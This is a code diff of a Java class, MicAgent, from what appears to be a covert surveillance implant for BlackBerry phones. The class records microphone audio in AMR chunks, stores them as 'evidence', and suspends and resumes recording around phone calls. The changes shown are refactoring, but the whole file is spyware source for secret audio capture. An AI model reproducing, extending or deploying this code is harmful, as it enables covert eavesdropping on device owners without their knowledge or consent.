@@ -19,14 +19,12 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
-import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
 import blackberry.record.AudioRecorder;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class MicAgent.
  */
@@ -39,8 +37,6 @@ public final class MicAgent extends Agent implements PhoneListener {
 
     static final int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5,
             5, 0, 0, 0, 0 };
-
-    
 
     //#ifdef DEBUG
     static Debug debug = new Debug("MicAgent", DebugLevel.VERBOSE);
@@ -65,7 +61,8 @@ public final class MicAgent extends Agent implements PhoneListener {
     public MicAgent(final boolean agentEnabled) {
         super(Agent.AGENT_MIC, agentEnabled, Conf.AGENT_MIC_ON_SD, "MicAgent");
         //#ifdef DBC
-        Check.asserts(Evidence.convertTypeEvidence(agentId) == EvidenceType.MIC,
+        Check.asserts(
+                Evidence.convertTypeEvidence(agentId) == EvidenceType.MIC,
                 "Wrong Conversion");
         //#endif
     }
@@ -90,7 +87,7 @@ public final class MicAgent extends Agent implements PhoneListener {
         }
     }
 
-    public synchronized void actualStart() {
+    public void actualStart() {
         //#ifdef DEBUG
         debug.info("start");
         //#endif
@@ -115,7 +112,7 @@ public final class MicAgent extends Agent implements PhoneListener {
 
     }
 
-    public synchronized void actualStop() {
+    public void actualStop() {
         //#ifdef DEBUG
         debug.info("stop");
         //#endif
@@ -201,7 +198,7 @@ public final class MicAgent extends Agent implements PhoneListener {
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
-    public synchronized void actualRun() {
+    public void actualRun() {
         //#ifdef DBC
         Check.requires(recorder != null, "actualRun: recorder == null");
         //#endif
@@ -248,7 +245,7 @@ public final class MicAgent extends Agent implements PhoneListener {
             Check.requires(evidence != null, "Null log");
             //#endif
 
-            evidence.createEvidence(getAdditionalData());
+            
             int offset = 0;
             if (Utils.equals(chunk, 0, AudioRecorder.AMR_HEADER, 0,
                     AudioRecorder.AMR_HEADER.length)) {
@@ -261,12 +258,13 @@ public final class MicAgent extends Agent implements PhoneListener {
             } else {
             }
             //#endif
-
+            
+            evidence.createEvidence(getAdditionalData());
             evidence.writeEvidence(chunk, offset);
             evidence.close();
         } else {
             //#ifdef DEBUG
-            debug.warn("zero chunk: " + chunk);
+            debug.warn("zero chunk ");
             //#endif
             numFailures += 1;
         }
@@ -343,103 +341,91 @@ public final class MicAgent extends Agent implements PhoneListener {
 
     public void callIncoming(int callId) {
         init();
-        
+
         //#ifdef DEBUG
         debug.trace("callIncoming");
         //#endif
 
-        final MicAgent agent = (MicAgent) AgentManager.getInstance().getItem(
-                AGENT_MIC);
+        final MicAgent agent = MicAgent.getInstance();
         agent.suspend();
     }
 
     public void callInitiated(int callid) {
         init();
-        
+
         //#ifdef DEBUG
         debug.trace("callInitiated");
         //#endif
-        final MicAgent agent = (MicAgent) AgentManager.getInstance().getItem(
-                AGENT_MIC);
+        final MicAgent agent = MicAgent.getInstance();
         agent.suspend();
     }
 
     public void callDisconnected(int callId) {
         init();
-        
+
         //#ifdef DEBUG
         debug.trace("callDisconnected");
         //#endif
-        final MicAgent agent = (MicAgent) AgentManager.getInstance().getItem(
-                AGENT_MIC);
+        final MicAgent agent = MicAgent.getInstance();
         agent.resume();
     }
 
+    public static MicAgent getInstance() {
+        return (MicAgent) AgentManager.getInstance().getItem(AGENT_MIC);
+    }
+
     public void callAdded(int callId) {
-        // TODO Auto-generated method stub
 
     }
 
     public void callAnswered(int callId) {
-        // TODO Auto-generated method stub
 
     }
 
     public void callConferenceCallEstablished(int callId) {
-        // TODO Auto-generated method stub
 
     }
 
     public void callConnected(int callId) {
-        // TODO Auto-generated method stub
 
     }
 
     public void callDirectConnectConnected(int callId) {
-        // TODO Auto-generated method stub
 
     }
 
     public void callDirectConnectDisconnected(int callId) {
-        // TODO Auto-generated method stub
 
     }
 
     public void callEndedByUser(int callId) {
-        // TODO Auto-generated method stub
 
     }
 
     public void callFailed(int callId, int reason) {
-        // TODO Auto-generated method stub
 
     }
 
     public void callHeld(int callId) {
-        // TODO Auto-generated method stub
 
     }
 
     public void callRemoved(int callId) {
-        // TODO Auto-generated method stub
 
     }
 
     public void callResumed(int callId) {
-        // TODO Auto-generated method stub
 
     }
 
     public void callWaiting(int callid) {
-        // TODO Auto-generated method stub
 
     }
 
     public void conferenceCallDisconnected(int callId) {
-        // TODO Auto-generated method stub
 
     }
-    
+
     private synchronized void init() {
         if (!Path.isInizialized()) {
             Path.makeDirs();
